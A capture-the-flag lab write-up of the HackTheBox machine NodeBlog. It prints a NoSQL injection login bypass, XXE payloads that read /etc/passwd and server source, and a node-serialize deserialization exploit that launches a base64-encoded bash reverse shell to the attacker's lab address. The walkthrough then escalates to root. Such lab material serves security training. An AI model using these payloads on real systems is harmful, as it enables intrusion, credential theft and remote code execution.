### NodeBlog HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.139

Nmap Scan:

```
─$ nmap -sCV 10.10.11.139 -p22,5000 -oN nmapscan          
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-25 00:34 WAT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Nmap scan report for 10.10.11.139
Host is up (0.33s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.17 seconds
                                                                
```

From the scan we see that only 2 ports are open which are just ssh and http

#### Web Server Enumeration

Heading over to the web server shows this page
![image](https://user-images.githubusercontent.com/113513376/221321193-b601500e-83b7-4402-8d9d-fd6da0c0de0e.png)

Checking the web server header shows its running on express which is a nodejs web server

```
└─$ curl -v -I http://10.10.11.139:5000/
*   Trying 10.10.11.139:5000...
* Connected to 10.10.11.139 (10.10.11.139) port 5000 (#0)
> HEAD / HTTP/1.1
> Host: 10.10.11.139:5000
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< X-Powered-By: Express
X-Powered-By: Express
< Content-Type: text/html; charset=utf-8
Content-Type: text/html; charset=utf-8
< Content-Length: 1891
Content-Length: 1891
< ETag: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
ETag: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
< Date: Sat, 25 Feb 2023 03:47:16 GMT
Date: Sat, 25 Feb 2023 03:47:16 GMT
< Connection: keep-alive
Connection: keep-alive
< Keep-Alive: timeout=5
Keep-Alive: timeout=5

< 
* Connection #0 to host 10.10.11.139 left intact
```

There's a login page
![image](https://user-images.githubusercontent.com/113513376/221321469-08a6fa01-f556-4dfd-8c9f-95d1431affc0.png)

Trying weak/default credential doesn't work

Note that how you would have a LAMP stack running Apache and MySQL, NPM aka node package manager could be in use on an Express Server and they usually configure those to run with NOSQL dbs like Redis, Couch, influx or Mongo db

I'll attempt NOSQL Injection 

While messing with the request i was able to throw an error that leaked the path of the web server
![image](https://user-images.githubusercontent.com/113513376/221323416-13489052-c5b0-4a70-b302-121f51433f15.png)

```
<pre>SyntaxError: Unexpected token l in JSON at position 21<br>
  &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> 
  &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)<br>
  &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18<br> 
  &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<br> 
  &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)<br> 
  &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<br>
  &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br>
  &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> 
  &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)
</pre>
```

Using this payload works:
![image](https://user-images.githubusercontent.com/113513376/221324337-58269775-0870-47f9-aa95-dd4c49658453.png)

```
Payload: {"user": {"$ne": null}, "password": {"$ne": null} }
```

Here's the login post request

```
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 17
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user": {"$ne": null}, "password": {"$ne": null} }
```

We are now logged in and we see two functions which are new article and a upload function
![image](https://user-images.githubusercontent.com/113513376/221324613-2e31b728-9cf2-40ad-9ed2-3b8961e7c3ed.png)

Checking the new article shows this 
![image](https://user-images.githubusercontent.com/113513376/221324732-6136868e-e2a6-4c0b-b82a-4d2d42d4d372.png)

I'll try creating an article with intercepting the request in burp

But nothing interesting here 
![image](https://user-images.githubusercontent.com/113513376/221324843-82321a8f-6b4d-4642-8cd9-3d631eee92ae.png)

Time to check the upload function

I uploaded a random file and i got this
![image](https://user-images.githubusercontent.com/113513376/221324899-e81e985a-1f25-4c37-9656-369123354b5f.png)

Hmm it seems it requires an xml file with the article format  

```
 Title Description Markdown
```

I created an xml file with those values needed [Resource](https://www.w3schools.com/xml/)

```
<?xml version="1.0" encoding="UTF-8"?>
<article>
  <title>Learn Pwn</title>
  <description>Lol</description>
  <markdown>`hehe`</markdown>
</article>
```

After i uploaded it i got the content of tags 
![image](https://user-images.githubusercontent.com/113513376/221326190-2ad801f7-c715-4408-8647-8042e65ed198.png)

With this, we can leverage this to read local file via XXE

Since it will show the content of what's in the tag 

Here's the resouce i got the payload [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT title ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<article>
  <title>&file;</title>
  <description>Lol</description>
  <markdown>`hehe`</markdown>
</article>
```

Uploading that leaks the `/etc/passwd` file
![image](https://user-images.githubusercontent.com/113513376/221326390-99f28637-b05f-42f7-ae0d-cded719c698a.png)
![image](https://user-images.githubusercontent.com/113513376/221326415-0f26039c-df4c-4dfb-8ee7-f205e931241a.png)

Since we previously leaked the path of the web server and we know that its a nodejs web server, lets read the web server source code

After trying various common files like app.js, main.js eventually server.js worked

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT title ANY>
<!ENTITY file SYSTEM "file:///opt/blog/server.js">
]>
<article>
  <title>&file;</title>
  <description>Lol</description>
  <markdown>`hehe`</markdown>
</article>
```

Uploading it leaks the web app source code
![image](https://user-images.githubusercontent.com/113513376/221338456-c3b3ac93-a82a-4fab-8648-6b00a7cac1fc.png)

Heres' the updated one
![image](https://user-images.githubusercontent.com/113513376/221338582-08c61f26-6afc-41c6-9c29-63495dae1321.png)
![image](https://user-images.githubusercontent.com/113513376/221338588-e7fb5c48-f590-407f-b932-01f6c2b66a43.png)

From this we know that the secret key is `UHC-SecretKey-123` also here's whats interesting

```
function authenticated(c) {
    if (typeof c == undefined)
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash(md5).update(cookie_secret + c.user).digest(hex)) ){
        return true
    } else {
        return false
    }
}
```

We see that while it tries authenticating a user it does serialization on the cookie

That means that we can perform a deserialzation attack 

Searching for NodeJS Deserialzation leads here [Exploit](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

Now from the source script we know that its the cookie thats being serialized 

Decoding the cookie gives this 
![image](https://user-images.githubusercontent.com/113513376/221339355-f2683eea-ebef-4a55-9ff9-abd03a118a5a.png)

Since we know the format here's the exploit

I'll make a base64 encoded reverse shell

```
┌──(mark㉿haxor)-[~/Desktop/Tools]
└─$ echo -n "bash -i >& /dev/tcp/10.10.14.10/1337 0>&1" | base64 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC8xMzM3IDA+JjE=
```

Here's the final exploit

```
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC8xMzM3IDA+JjE=|base64 -d|bash', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

I will urlencode it and replace it with the value stored in auth
![image](https://user-images.githubusercontent.com/113513376/221339490-1bd7a03f-7cb8-4356-b505-7e0e59e87f54.png)
![image](https://user-images.githubusercontent.com/113513376/221339511-98de8325-0fe2-40d2-b14c-b725b7d4b880.png)

After forwarding the request i get a connection back from our listener

```
└─$ nc -lvnp 1337       
listening on [any] 1337 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.139] 53202
bash: cannot set terminal process group (864): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ 
```

We're user admin but we can't access the directory
![image](https://user-images.githubusercontent.com/113513376/221339645-ad9b8485-14a8-4fcd-a11a-d9138a06e160.png)

Checking internal ports shows 

```
admin@nodeblog:/home$ ss -tulnp
ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process                                                                         
udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096           127.0.0.1:27017          0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*                                                                                     
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*                                                                                     
tcp     LISTEN   0        511                    *:5000                 *:*      users:(("node /opt/blog/",pid=864,fd=20))                                      
tcp     LISTEN   0        128                 [::]:22                [::]:*                                                                                     
admin@nodeblog:/home$ 
```

To connect to the mongodb i'll first stabilize my shell

```
script -c /bin/bash /dev/null 
CTRL +Z
stty raw -echo;fg
```

Now i'll connect to the db 
![image](https://user-images.githubusercontent.com/113513376/221339940-1956d8e6-76c6-4033-b69c-477c82d7d643.png)

We get the admin password as `IppsecSaysPleaseSubscribe`

Running `sudo -l` shows we can run all as root

```
admin@nodeblog:/tmp$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
admin@nodeblog:/tmp$ 
```

To get root is as easy as doing `sudo su`

```
admin@nodeblog:/tmp$ sudo su
root@nodeblog:/tmp# cd /root
root@nodeblog:~# ls -al
total 60
drwx------ 1 root root   162 Jan  4  2022 .
drwxr-xr-x 1 root root   180 Dec 27  2021 ..
-rw------- 1 root root 10687 Jan  4  2022 .bash_history
-rw-r--r-- 1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x 1 root root    56 Jan  4  2022 .cache
drwx------ 1 root root    22 Dec 13  2021 .config
-rw------- 1 root root    39 Dec 31  2021 .lesshst
drwxr-xr-x 1 root root    90 Dec 13  2021 .npm
drwxr-xr-x 1 root root   148 Feb 25 03:40 .pm2
-rw-r--r-- 1 root root   161 Dec  5  2019 .profile
drwx------ 1 root root    30 Jul  2  2021 .ssh
-rw------- 1 root root 13633 Jan  4  2022 .viminfo
-rw-r--r-- 1 root root    33 Feb 25 03:41 root.txt
drwxr-xr-x 1 root root     6 Jul  2  2021 snap
root@nodeblog:~#
```

And we're done

<br> <br>
[Back To Home](../../index.md)

